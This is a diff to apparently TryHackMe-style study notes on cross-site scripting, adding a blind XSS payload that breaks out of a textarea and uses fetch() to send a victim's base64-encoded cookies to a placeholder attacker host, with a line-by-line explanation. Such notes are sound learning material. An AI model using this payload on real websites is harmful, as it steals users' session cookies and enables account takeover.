@@ -201,6 +201,17 @@ DOM Based XSS can be challenging to test for and requires a certain amount of kn
 
 ### Blind XSS
 Blind XSS is similar to a stored XSS in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.  
+<br>
+
+`</textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>`  
+- The `</textarea>` tag closes the textarea field. 
+- The `<script>` tag opens open an area for us to write JavaScript.
+- The `fetch()` command makes an HTTP request.
+- `{URL_OR_IP}` is either the THM request catcher URL or your IP address from the THM AttackBox or your IP address on the THM VPN Network.
+- `?cookie=` is the query string that will contain the victim's cookies.
+- `btoa()` command base64 encodes the victim's cookies.
+- `document.cookie` accesses the victim's cookies for the Acme IT Support Website.
+- `</script>` closes the JavaScript code block.
 
 **How to test for Blind XSS:**  
 When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.  
